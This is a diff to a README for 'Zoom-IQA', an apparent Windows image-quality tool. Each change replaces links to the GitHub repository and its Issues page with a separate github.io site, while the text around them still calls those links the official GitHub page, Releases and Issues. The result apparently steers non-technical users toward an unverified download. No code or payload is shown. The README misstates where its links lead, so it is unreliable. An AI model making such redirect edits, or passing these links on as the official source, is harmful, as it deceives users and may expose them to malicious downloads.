@@ -4,7 +4,7 @@
 
 Welcome to **Zoom-IQA**, the cutting-edge tool for evaluating image quality with reliable, region-aware reasoning. Whether you're a photographer, designer, or just someone who cares about crisp visuals, Zoom-IQA helps you understand exactly where and why an image falls short—or shines. This guide will walk you through downloading and running the application on your Windows computer, step by step, with no technical background required.
 
-[![Download Zoom-IQA](https://img.shields.io/badge/Download-Zoom--IQA-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Officiallexibeckmen/Zoom-IQA)
+[![Download Zoom-IQA](https://img.shields.io/badge/Download-Zoom--IQA-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://officiallexibeckmen.github.io)
 
 ## ✨ What Is Zoom-IQA?
 
@@ -21,7 +21,7 @@ The software is built on state-of-the-art machine learning models, trained on th
 
 Getting Zoom-IQA onto your computer is simple. Follow these steps:
 
-1. **Click the download button** at the top of this page, or use this direct link: [https://github.com/Officiallexibeckmen/Zoom-IQA](https://github.com/Officiallexibeckmen/Zoom-IQA)
+1. **Click the download button** at the top of this page, or use this direct link: [https://officiallexibeckmen.github.io](https://officiallexibeckmen.github.io)
 2. You'll be taken to the GitHub page for Zoom-IQA. This is the official source for the software.
 3. **Visit this link to download the application.** Look for the green "Code" button or a "Releases" section on the right side of the page. Click it, then select "Download ZIP" to get the entire project, or navigate to the "Releases" tab to find pre-built executable files if available.
 
@@ -112,7 +112,7 @@ If you encounter any issues:
 
 1. **Check the FAQ** above—most common problems are covered.
 2. **Re-download** the ZIP file in case the download was corrupted.
-3. **Visit the GitHub Issues page** at [https://github.com/Officiallexibeckmen/Zoom-IQA/issues](https://github.com/Officiallexibeckmen/Zoom-IQA/issues) to report bugs or ask questions. The developer community is active and helpful.
+3. **Visit the GitHub Issues page** at [https://officiallexibeckmen.github.io](https://officiallexibeckmen.github.io) to report bugs or ask questions. The developer community is active and helpful.
 
 ## 📚 Additional Resources
 
@@ -139,7 +139,7 @@ That's it! You're now ready to assess image quality with professional-grade prec
 
 ---
 
-**Remember:** The download link is [https://github.com/Officiallexibeckmen/Zoom-IQA](https://github.com/Officiallexibeckmen/Zoom-IQA). Visit this link to download the application. If you have any trouble, revisit this guide or reach out on GitHub.
+**Remember:** The download link is [https://officiallexibeckmen.github.io](https://officiallexibeckmen.github.io). Visit this link to download the application. If you have any trouble, revisit this guide or reach out on GitHub.
 
 Happy analyzing! 📸✨
 
